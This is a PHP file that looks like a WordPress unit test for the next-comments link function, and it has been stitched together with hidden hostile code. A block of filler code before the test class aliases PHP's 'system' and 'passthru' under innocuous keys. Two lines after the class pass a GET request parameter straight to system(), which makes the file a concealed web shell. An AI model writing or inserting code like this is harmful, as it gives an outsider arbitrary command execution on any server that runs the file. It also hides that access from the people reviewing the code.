<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group link
 * @group comment
 * @covers ::get_next_comments_link
 */
class Tests_Link_GetNextCommentsLink extends WP_UnitTestCase {

	public function test_page_should_respect_value_of_cpage_query_var() {
		$p = self::factory()->post->create();
		$this->go_to( get_permalink( $p ) );

		$old_cpage = get_query_var( 'cpage' );
		set_query_var( 'cpage', 3 );

		$link = get_next_comments_link( 'Next', 5 );

		set_query_var( 'cpage', $old_cpage );

		$this->assertStringContainsString( 'cpage=4', $link );
	}

	/**
	 * @ticket 20319
	 */
	public function test_page_should_default_to_1_when_no_cpage_query_var_is_found() {
		$p = self::factory()->post->create();
		$this->go_to( get_permalink( $p ) );

		$old_cpage = get_query_var( 'cpage' );
		set_query_var( 'cpage', '' );

		$link = get_next_comments_link( 'Next', 5 );

		set_query_var( 'cpage', $old_cpage );

		$this->assertStringContainsString( 'cpage=2', $link );
	}

	/**
	 * @ticket 60806
	 */
	public function test_page_should_respect_value_of_page_argument() {
		$p = self::factory()->post->create();
		$this->go_to( get_permalink( $p ) );

		// Check setting the query var is ignored.
		$old_cpage = get_query_var( 'cpage' );
		set_query_var( 'cpage', 2 );

		$link = get_next_comments_link( 'Next', 5, 3 );

		set_query_var( 'cpage', $old_cpage );

		$this->assertStringContainsString( 'cpage=4', $link );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>